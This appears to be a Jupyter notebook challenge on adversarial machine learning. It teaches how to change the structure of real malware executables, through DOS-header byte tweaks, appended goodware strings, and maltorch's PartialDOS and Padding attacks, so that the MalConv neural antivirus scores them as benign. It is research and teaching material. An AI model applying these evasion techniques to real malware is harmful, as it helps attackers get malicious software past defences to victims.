# Evading AI-powered Antivirus Programs

Welcome to dark side of AI offensive security!
In this challenge you will try to craft Adversarial EXEmples against different models, and this is achieved by just manipulating the structure of executables (not the code!)

To help you out in this challenge, we provide you some code to load and interact with the antivirus to evade.
We first install the technology we will be using as AV:

In [ ]:
import maltorch
from maltorch.data.loader import load_single_exe
from maltorch.zoo.malconv import MalConv
from pathlib import Path
import os

data_folder = Path(os.path.abspath('')) / "malware_samples"
model_folder = Path(os.path.abspath('')) / "models"

model = MalConv().create_model(model_path=str(model_folder / "MalConv"))


MalConv is a **Deep Neural Network** developed in 2017 by an amazing team of people (https://arxiv.org/abs/1710.09435), and it has been trained to deal with malware samples given in input.

In [ ]:
import torch

scores = []
very_malicious_samples = []
for malware_file in data_folder.glob("*"):
    x = load_single_exe(malware_file)
    if x is None:
        continue
    print(malware_file.name)
    score = torch.sigmoid(model(x.unsqueeze(0))).item()
    print(f"Score: {score}")
    scores.append(score)
    if score > 0.95:
        very_malicious_samples.append(malware_file)

print(f"There are {len(very_malicious_samples)} very likely-malicious samples")


Let's have a look at the scores that this model has produced. We plot the histogram of probabilities that have been associated with the malicious samples we scraped from GitHub.

In [ ]:
import numpy as np
import matplotlib.pyplot as plt

counts, bins = np.histogram(scores)
plt.stairs(counts, bins)
plt.show()

Remember that these samples have been collected in the wild, meaning that they could differ very much from the original distribution used during training (this model has been trained on data from 2017).
We will only use the ones with high-probability (> 95%).

# Evaluating the robustness against attacks

Machne learning is cool, but is it secure to deploy?
Let's try with an attack that manipulates the unused DOS metadata!

In [ ]:
from tqdm import tqdm
from random import randbytes
import copy

example_sample = data_folder / "ClientUpdate.exe (x86).bin"
with open(example_sample, "rb") as f:
    x_sample = bytearray(f.read())


queries = 200

best_adv = None
best_score = np.inf

for q in (progress:=tqdm(range(queries))):
    x_adv = copy.deepcopy(x_sample)
    x_adv = x_adv[:2] + randbytes(58) + x_adv[60:]
    x_torch = torch.frombuffer(x_adv, dtype=torch.uint8).unsqueeze(0)
    adv_score = torch.sigmoid(model(x_torch.long())).item()
    if adv_score < best_score:
        best_adv = x_adv
        best_score = adv_score
    progress.set_description(f"Best score: {best_score*100:.3f} %")
    if adv_score < 0.5:
        print("Random attack successful!")
        break



Not so effective, isn't?
Even when you try multiple time: it seems that random modifications of DOS header are not enough for this sample.
Let's try another approach: we try with only *readable strings*.
This is to give a shot to the Cylance write-up: https://skylightcyber.com/2019/07/18/cylance-i-kill-you/


In [ ]:
with open(data_folder / ".." / "goodware_strings.txt", "r") as f:
    all_goodware_strings = f.readlines()


In [ ]:
import random

queries = 200

best_adv = None
best_score = np.inf

all_extracted = ''.join(all_goodware_strings)[:2**20]
payload = ''
for q in (progress:=tqdm(range(queries))):
    random_string = ''.join(random.choices(list(all_goodware_strings), k=200))
    random_string = bytearray(random_string, 'utf-8')
    payload += all_extracted
    x_adv = copy.deepcopy(x_sample)
    x_adv = x_adv + random_string
    x_torch = torch.frombuffer(x_adv, dtype=torch.uint8).unsqueeze(0)
    adv_score = torch.sigmoid(model(x_torch.long())).item()
    if adv_score < best_score:
        best_adv = x_adv
        best_score = adv_score
    progress.set_description(f"Best score: {best_score*100:.3f} %")
    if adv_score < 0.5:
        print("Random attack successful!")
        break

If you execute this strategy multiple times, *sometimes* you are able to drop the computed probability below zero!
But again, it is a random approach: you can try to customize it in order to keep relevant strings inside the payload, or merge the two approaches!

In [ ]:


for q in (progress:=tqdm(range(queries))):
    x_adv = copy.deepcopy(x_sample)

    # HERE MODIFY x_adv as you please!

    x_torch = torch.frombuffer(x_adv, dtype=torch.uint8).unsqueeze(0)
    adv_score = torch.sigmoid(model(x_torch.long())).item()
    if adv_score < best_score:
        best_adv = x_adv
        best_score = adv_score
    progress.set_description(f"Best score: {best_score*100:.3f} %")
    if adv_score < 0.5:
        print("Custom attack successful!")
        break

# Automating attacks with maltorch

The library you have imported to create MalConv does not only provide models, but also attacks!
For instance, we now compute a guided attack that changes meaningful bytes using the parameters of the target themselves.
Since maltorch fully use PyTorch behind the curtain, we need to create DataLoaders to pass to the created attack:

In [ ]:
from maltorch.adv.evasion.partialdos import PartialDOS
from maltorch.data.loader import  create_labels
from torch.utils.data import DataLoader, TensorDataset

x = torch.frombuffer(x_sample, dtype=torch.uint8).unsqueeze(0).long()
dataset = TensorDataset(x, create_labels(x, 1))
dataloader = DataLoader(dataset, batch_size=1, shuffle=False)

print(f"Original probability: {torch.sigmoid(model(x)).item():.2f}")

query_budget = 10
attack = PartialDOS(query_budget=query_budget)
results = attack(model, dataloader)
for advx,_ in results:
    print(f"Adv. probability: {torch.sigmoid(model(advx)).item():.2f}")

What the...? By just carefully-manipulating (not in a random way) the header DOS, this sample is now seen as benign by the network!
You can now test on all the samples in the folder that were considered very malicious:

In [ ]:
for sample_path in data_folder.glob("*"):
    with open(sample_path, "rb") as f:
        x = bytearray(f.read())
    x = load_single_exe(sample_path).unsqueeze(0)
    if x is None:
        continue
    if torch.sigmoid(model(x)) < 0.95:
        continue
    print("---- ---- ----")
    print(sample_path.name)
    dataset = TensorDataset(x, create_labels(x, 1))
    dataloader = DataLoader(dataset, batch_size=1, shuffle=False)
    print(f"Original probability: {torch.sigmoid(model(x)).item():.2f}")
    query_budget = 10
    attack = PartialDOS(query_budget=query_budget)
    results = attack(model, dataloader)
    for advx,_ in results:
        print(f"Adv. probability: {torch.sigmoid(model(advx)).item():.2f}")


Interesting! With only a 58-byte manipulation, this attack was able to reduce the probability of roughly half of the samples below the detection threshold (which is 0.5 for this model).

Could be better, right? Fear no more: maltorch is full of attacks and networks that you can test on your own!

For instance, you can create a Padding attack (appending byte at the end, but optimized one by one).

In [ ]:
from maltorch.adv.evasion.padding import Padding

for sample_path in data_folder.glob("*"):
    with open(sample_path, "rb") as f:
        x = bytearray(f.read())
    x = load_single_exe(sample_path)
    if x is None:
        continue
    x = x.unsqueeze(0)
    if torch.sigmoid(model(x)) < 0.95:
        continue
    print(sample_path)
    dataset = TensorDataset(x, create_labels(x, 1))
    dataloader = DataLoader(dataset, batch_size=1, shuffle=False)
    print(f"Original probability: {torch.sigmoid(model(x)).item():.2f}")
    query_budget = 10
    attack = Padding(query_budget=query_budget, padding=1024)
    results = attack(model, dataloader)
    for advx,_ in results:
        print(f"Adv. probability: {torch.sigmoid(model(advx)).item():.2f}")